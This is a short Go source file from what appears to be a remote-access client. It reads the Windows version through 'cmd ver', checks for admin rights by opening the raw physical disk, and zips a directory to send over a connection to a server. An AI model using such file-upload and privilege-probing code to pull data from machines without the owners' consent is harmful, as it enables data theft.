package client

import (
	"bytes"
	"errors"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/pierrre/archivefile/zip"
)

// GetVer gets the major version of the current installed
// Windows
func GetVer() (int, error) {
	cmd := exec.Command("cmd", "ver")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return 0, err
	}
	osStr := strings.Replace(out.String(), "\n", "", -1)
	osStr = strings.Replace(osStr, "\r\n", "", -1)
	tmp1 := strings.Index(osStr, "[Version")
	tmp2 := strings.Index(osStr, "]")
	if tmp1 == -1 || tmp2 == -1 {
		return 0, errors.New("Version string has wrong format")
	}
	longVer := osStr[tmp1+9 : tmp2]
	majorVerStr := strings.SplitN(longVer, ".", 2)[0]
	majorVerInt, err := strconv.Atoi(majorVerStr)
	if err != nil {
		return 0, errors.New("Version could not be converted to int")
	}
	return majorVerInt, nil
}

// CheckElevate checks whether the current process has administrator
// privileges
func CheckElevate() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

// TODO: Remove Zipdir because .zip files are insecure and can be exploited
// Zipdir archives files to zip and sends them to server
func (c *connection) Zipdir(path string) error {
	progress := func(archivePath string) {
	}
	return zip.Archive(path, c.Conn, progress)
}
